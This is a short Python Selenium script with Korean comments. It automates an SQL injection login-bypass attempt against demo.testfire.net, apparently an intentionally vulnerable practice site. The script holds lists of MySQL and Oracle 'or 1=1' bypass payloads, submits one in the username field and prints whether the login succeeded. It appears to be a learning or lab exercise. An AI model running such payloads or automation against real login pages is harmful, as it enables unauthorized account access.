from selenium import webdriver
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

def sqlinjection():
    sqlinjection_mysql = ['or 1=1--', '\' or 1=1--',
                          '\" or 1=1--',
                          '\' or \'1\'=\'1',
                          '\" or \"1\"=\"1']

    sqlinjection_oracle = ['\' or 1=1#', '\" or 1=1#',
                           'or 1=1#',
                           '\' or \'1\'=\'1',
                           '\" or \"1\"=\"1']
    return sqlinjection_mysql[1]

# 웹 드라이버 로드
driver = webdriver.Chrome(executable_path='chromedriver')

# 접속하고자 하는 페이지
URL = "http://demo.testfire.net/login.jsp"

# 페이지 접속
driver.get(URL)

# 입력 파라미터
username = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, "#uid"))
)

password = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, "#passw"))
)

# 버튼(입력 값 전송할 버튼)
submit_button = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CLASS_NAME, "btn.btn-success"))
)
# 입력 파라미터에 값 전송
username.send_keys("id'or 1=1#")
password.send_keys("fake")

# 버튼 클릭
submit_button.click()

try:
    error_message = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CLASS_NAME, "bg-danger"))
)
    success_message = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CLASS_NAME, "bg-success"))
    )
    if(success_message.text==""):
        print('로그인 실패:', error_message.text)
    else:
        print('로그인 성공:', success_message.text)

    # 로그인 실패에 따른 추가 작업 수행
except NoSuchElementException:
    # 로그인 성공 후 작업 수행

    pass

#코드 실행 후 마치지 않고 유지하기 위함
while (True):
        pass
